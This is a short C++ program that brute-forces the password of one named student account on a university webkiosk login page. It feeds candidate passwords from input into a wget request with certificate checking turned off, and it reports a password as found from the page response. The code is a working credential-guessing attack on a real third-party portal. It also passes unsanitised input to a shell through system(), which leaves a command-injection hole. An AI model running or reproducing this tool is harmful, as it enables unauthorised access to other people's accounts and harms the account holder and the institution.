#include <bits/stdc++.h>
//#include <ifstream>
using namespace std;
int main(int argc, char const *argv[])
{
	string username="101403061";
	string password;
	while(cin >> password)
	{
		string cmd=" wget --no-check-certificate \"https://webkiosk.thapar.edu/CommonFiles/UserAction.jsp?UserType=S&MemberCode=" + username + "&Password=" + password + "\" -O temp.txt";
 		system(cmd.c_str());
 		ifstream fin;
 		fin.open("temp.txt");
 		string isCorrect;
 		fin >> isCorrect;
 		if(isCorrect == "<html>")
 		{	
 			cout << "password is "<< password;
			break; 		
 		}
	}	
	return 0;
}	